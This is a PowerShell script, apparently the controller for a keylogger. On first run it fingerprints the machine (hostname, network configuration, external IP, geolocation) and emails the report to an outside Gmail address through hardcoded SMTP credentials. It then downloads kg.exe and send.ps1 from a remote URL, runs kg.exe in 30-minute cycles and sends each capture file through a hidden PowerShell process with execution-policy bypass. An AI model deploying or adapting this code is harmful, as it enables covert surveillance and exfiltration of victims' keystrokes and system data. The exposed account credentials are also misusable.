## this script used to be called fingerprint.ps1
## version 0.5(alpha)
## hitherto the executable is kg.exe and the sender script is send.ps1

## run the meat of this script if the fingerprint file doesnt exist i.e. first run

$pwd =  "$home\AppData\Local"
$browser = New-Object System.Net.WebClient
cd $pwd

function get-hash([string]$textToHash) {
    $hasher = new-object System.Security.Cryptography.MD5CryptoServiceProvider
    $toHash = [System.Text.Encoding]::UTF8.GetBytes($textToHash)
    $hashByteArray = $hasher.ComputeHash($toHash)
    foreach($byte in $hashByteArray)
    {
      $result += "{0:X2}" -f $byte
    }
    return $result;
 }


if( -Not (Test-Path $pwd\fingerprint) ){
    $InternalIP = ipconfig
    $HostName = hostname
    $ExternalIP = $browser.DownloadString("https://ifconfig.me/ip")
    $GeoIP = $browser.DownloadString("https://ipinfo.io/$ExternalIP")
    
    $Body = "Computer name is $Hostname`n`n*******************`n`nLocal Area Network Configuration`n`n$InternalIP`n`n*******************`n`nInternet Facing IP address`n`n$ExternalIP`n`n*******************`n`nGeoIP information From External IP address`n`n$GeoIP"
    $Fingerprint = get-hash($body)
    $Fingerprint >> $pwd/fingerprint
    $Body = "Computer name is $Hostname`n`n*******************`n`nLocal Area Network Configuration`n`n$InternalIP`n`n*******************`n`nInternet Facing IP address`n`n$ExternalIP`n`n*******************`n`nGeoIP information From External IP address`n`n$GeoIP`n`n*******************`n`nAnd The Computer will be identified with the id $Fingerprint"
    

    $EmailTo = "enduad@gmail.com"
    $EmailFrom = "elbethender@gmail.com"
    $Subject = "New Host Report" 
    $SMTPServer = "smtp.gmail.com" 
    $SMTPMessage = New-Object System.Net.Mail.MailMessage($EmailFrom,$EmailTo,$Subject,$Body)
    $SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587) 
    $SMTPClient.EnableSsl = $true 
    $SMTPClient.Credentials = New-Object System.Net.NetworkCredential("elbethender@gmail.com", "homernomer"); 
    $SMTPClient.Send($SMTPMessage)
    
    ## done sending fingerprint 
    ## now to download the program and scripts
    
    # download kg      #
    $browser.DownloadFile( "https://rawcdn.githack.com/commnc/sources/f1c5bfa6094e71c5165fcccfc07710887c100e91/kg.exe" , "$pwd\kg.exe" )

    # download sender  #
    
    $browser.DownloadFile( "https://rawcdn.githack.com/commnc/sources/f1c5bfa6094e71c5165fcccfc07710887c100e91/send.ps1" , "$pwd\send.ps1" )
    
}

$ComputerFingerPrint = Get-Content $pwd\fingerprint

# run for 30 minutes after calling kg.exe with the datecode

$runDuration = 1800 ## final value should reflect a rate of update of 30 minutes(1800 seconds)
## sanitizing previous runs
taskkill /f /im kg.exe
if( Test-Path $pwd\*.rpr ){
    del $pwd\*.rpr
}

while (1){
        $DateString = [String](Get-Date)
        $DateString = $DateString.Replace(" " , "_")
        $DateString = $DateString.Replace(":" , "_")
        $DateString = $DateString.Replace("/" , "_")
        
        $fileName = "$DateString.rpr"
        start $pwd\kg.exe "$pwd\$fileName"
        timeout /t $runDuration /nobreak
        taskkill /f /im kg.exe
        powershell -executionpolicy bypass -windowstyle hidden -file $pwd\send.ps1 "$fileName"
        del "$fileName"
}